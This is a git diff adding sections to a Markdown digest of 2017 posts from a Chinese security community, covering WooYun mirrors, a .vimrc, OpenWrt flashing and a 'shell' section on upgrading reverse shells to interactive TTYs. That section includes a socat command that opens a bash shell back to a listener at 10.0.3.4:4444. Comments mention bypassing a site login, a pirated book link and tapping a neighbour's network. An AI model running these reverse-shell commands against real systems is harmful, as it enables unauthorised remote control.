@@ -7,6 +7,7 @@
 - [git](#git)
 - [Vim](#vim)
 - [tmux](#tmux)
+- [shell](#shell)
 - [端口转发](#端口转发)
 - [代理](#代理)
 - [crawler](#crawler)
@@ -18,6 +19,7 @@
 - [HTML](#html)
 - [Docker](#docker)
 - [Python](#python)
+- [Openwrt](#openwrt)
 
 ## 技能树
 
@@ -182,6 +184,36 @@ HTTP
 
 ---
 
+<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ on 2017-07-20:
+
+乌云没有倒下一直都在！ 比较好点网速的的3个站,根据类型漏洞一个个过还是很刺激的，come 
+[乌云社区](http://zone.secbug.net/zone/index.html)
+
+
+[乌云Wiki](http://wiki.secbug.net/)
+
+
+[乌云漏洞平台+drops](http://wooyun.chamd5.org)
+
+
+...
+
+<img src="https://file.xiaomiquan.com/78/e9/78e9ff588e637881e951e6a67a256e8fae0f2bd3cbe34dda75f5839f21405851.jpg" width="25px"/> __吕土金__: 怎么注册乌云？需要先提交漏洞吗？
+
+<img src="https://file.xiaomiquan.com/60/b2/60b27269be5db4df43edc134493a7c84fcd2f5e0ee402c8120ef0c5d2b0969d9.jpg" width="25px"/> __leshack__: 怎么注册呢
+
+<img src="https://file.xiaomiquan.com/e5/95/e595f513a41c7340aa524a0b47d1673c3a698ffa32fa176df0886938c915d91f.jpg" width="25px"/> __Lion💬💬💬__: 如何登录啊
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这些都是镜像，没什么注册不注册的
+
+<img src="https://file.xiaomiquan.com/e5/95/e595f513a41c7340aa524a0b47d1673c3a698ffa32fa176df0886938c915d91f.jpg" width="25px"/> __Lion💬💬💬__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 有些帖子必须登陆有啥方法绕过么，是只能遍历那个数字？
+
+...
+
+---
+
+
+
 ## 书籍报告
 
 <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-25:
@@ -263,6 +295,27 @@ __#经验#__
 
 <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 意义不大
 
+
+...
+
+---
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-11:
+
+
+__#资源#__
+
+C# 灰帽，非常期待此书！嗯，中文版不知道国内何时译出。
+
+<img src="https://images.xiaomiquan.com/FphB0x6GKSB1hzrg6pb_DS8Ac3o-?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:gfy5VHMUm-Pte676xFpazaVkcN0=" width="50%" height="50%" align="middle"/>
+
+
+...
+
+<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 赞赞，如果需要看看pdf或者kindle版本的可以先下载看看，
+[http://www.finelybook.com/gray-hat-c-a-hackers-guide-to-creating-and-automating-security-tools/](http://www.finelybook.com/gray-hat-c-a-hackers-guide-to-creating-and-automating-security-tools/)
+
+<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 一般适合做图形化界面给小白做哦
 
 ...
 
@@ -452,6 +505,45 @@ SpaceVim is a community-driven vim distribution that seeks to provide layer feat
 
 ---
 
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-10:
+
+> 匿名用户 提问：
+余弦，你好。可以分享一下你的.vimrc文件吗？如果可以的话
+
+```
+color koehler
+syntax on
+set nocompatible
+set ruler
+set number
+set showcmd
+set incsearch
+set hlsearch
+set nobk
+set history=60
+set shiftwidth=4
+set softtabstop=4
+set tabstop=4
+set expandtab
+set helplang=cn
+set ttymouse=xterm2
+set fileencodings=utf-8,ucs-bom,gb18030,gbk,gb2312,cp936
+set termencoding=utf-8
+set encoding=utf-8
+```
+
+
+...
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 补充说明下：我的一切习惯的宗旨是：极简主义，够用就好。所以我的 Vim 配置文件非常简单，我不会用任何插件来加速我的效率，因为我的效率已经够高。之前我还说过，我在 Win 下甚至系统用 Notepad++ 作为我的首选编辑器。不一定要学我的方式。
+
+<img src="https://file.xiaomiquan.com/49/90/4990015a4b6cc0255dd2d9c160c50566417feed80276fbddfe3d4529b613771f.jpg" width="25px"/> __alan__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 适合自己的才是最好的😜
+
+
+...
+
+---
+
 ## tmux
 
 
@@ -516,6 +608,92 @@ screen -r sqlmap
 <img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 突然发觉这篇文章校稿的是我朋友😂
 
 <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 巧呀
+
+
+...
+
+---
+
+## shell
+
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-11:
+
+
+__#姿势#__
+
+升级简陋的 Shell 到完美交互的 TTYs 终端
+
+
+[Upgrading shells to fully interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
+
+ 
+
+这篇文章很赞，以前我们反弹回来的 NC Shell，操作实在太过简陋，一个命令输错就意味着丢失 Shell，没历史，没 Tab，没 Vim，就是个最最简陋的 Shell。
+
+反弹技巧不少，这里先不谈，有的是能得到完美的 TTYs 终端，这篇文章第一个方式其实也简单提了，虽然还不完美。
+
+文章介绍了三个技巧，如下：
+
+__Using Python for a psuedo terminal__
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+__Using socat__
+
++ Listener:
+
+```
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+```
+
++ Victim:
+
+```
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+```
+
+__Using stty options__
+
++ In reverse shell
+
+```
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+```
+
++ In Kali
+
+```
+$ stty raw -echo
+$ fg
+```
+
++ In reverse shell
+
+```
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> columns <cols>
+```
+
+我想精于 Linux 的同学应该还会有其他更好的技巧吧？😏
+
+<img src="https://images.xiaomiquan.com/Fj_Ou8qWblsD8PQbMkbsiFOsbVNk?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:m9ZuUhEYmVExE9s4WOF_-76vOkQ=" width="50%" height="50%" align="middle"/>
+<img src="https://images.xiaomiquan.com/FvH1DFbKMjFYlnJOg75OJTcHz1YO?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:HXPfrhY8yBHQnFbwYRbCWl2s7hE=" width="50%" height="50%" align="middle"/>
+<img src="https://images.xiaomiquan.com/Fig865CAfX1G7zfSlHpk6qHQwWgE?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Q7-DgFAG9jPiRq6mRqmY5BwXZFU=" width="50%" height="50%" align="middle"/>
+
+
+...
+
+<img src="https://file.xiaomiquan.com/74/dd/74dd868df857e0ffec8613ae99f0891f0e7088f3533e8bd16f9614477984d3f6.jpg" width="25px"/> __‍迷途の狼__: 不错的技巧，不过linux下监听win下反弹的cmd 也是很蛋疼 一个字符输错 又得重新输入 还乱码
+
+<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__: 不精通linux的想知道其他更好的技巧。。。。要是环境里没有python,没有socat，该如何。。。
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__: 没注意到第三种方式？
 
 
 ...
@@ -1048,3 +1226,70 @@ __分享文件:__
 ...
 
 ---
+
+
+## Openwrt
+
+
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-07-21:
+
+
+__#姿势#__
+
+爱折腾之将你的路由器刷成openwrt
+
+爱好安全的同学应该都喜欢折腾，一个不错的折腾方式，将你的路由器系统刷成一个开放式的嵌入式linux发行版。
+
+然后你可以在这个路由器上：
+挂在一个轻量型的web服务器、进行脱机下载、FTP服务器、安装去广告插件、科学上网、安装python，如果你的线路支持，还可以进行多拨，增加你的带宽，你可以安装python，只要你脑洞够大，拿来做啥都可以，甚至拿来接收shell。
+
+它是采用opkg的软件包管理技术，类似于CentOS下的yum，可以实现对预编译的二进制软件下载。
+说白了它可以让你的路由器变成一个小型的linux工作站，然后又没噪音，耗电量又少，是不是挺有意思！
+
+其实我当初接触linux就是从我家路由器刷机开始的，自己整天百度折腾了一个小博客放在上面，然后用iptables防火墙来管理家里内网，这个过程我慢慢去学linux方面的知识。
+不断折腾是学习的最好方式，对知识的记忆是最深刻的。
+
+其实国内大多数智能路由都是从OpenWrt的基础上改的，只是没有开放而已。
+
+开始折腾从百度：“你的路由器型号刷OpenWrt教程" 这个关键字开始。
+
+
+
+[http://wiki.openwrt.org/toh/start](http://wiki.openwrt.org/toh/start)
+
+这里看路由器支持信号列表，基本是智能路由器都可以。
+
+[博客 - UMU Corporation](https://my.oschina.net/umu618/?sort=time&catalog=269802&p=3)
+
+这个作者写了一系列的折腾日记。
+
+[如何从零开始学习OpenWrt？ - 知乎](https://www.zhihu.com/question/23363243)
+
+这里有个答案比较全，其中youtube链接上有中文的视频，适合深入。
+
+<img src="https://images.xiaomiquan.com/Fi23xYdja3zhVpZUhC1xx0QNTkds?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:4eNgQNY8Rf6HRWyoaQYrlO9A1GY=" width="50%" height="50%" align="middle"/>
+
+
+...
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 嘿嘿，如果你有路由器支持双wan，你可以用一个一般的路由器做个无线中继来将你邻居网络共享过来，然后接入到你的一个wan口，实现和你自己的宽带重叠，加大带宽😏，老司机也完全不用自己拉宽带了😜
+
+<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 曾经有段时间很想用双wan口叠加带宽，后来发现双wan口的家用路由不多，基本上都是企业级的才有，价格不菲啊！
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 一般是企业级的才有，便宜的三百多吧
+
+<img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__ replies to <img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 多拔还要看运营商玄学
+
+<img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 刚刷的梅林7.5，别诱惑我又去刷openwrt😂
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 哈哈，梅林7.5没刷过，不是openwrt最有名吗？尽量还是刷大品牌，很多大牛在用，走后门几率小
+
+<img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 以前刷过openwrt，WiFi模块有点问题，就转回去最慢的netgear固件。等有个副路由再折腾，断网太难受😂
+
+<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__ replies to <img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 嗯！成都电信的家用200M光纤可以支持4次同账号拔号，我家猫现在接出来的三条线都是独立拨号，独享带宽的，哇咔咔！😏
+
+...
+
+---
+
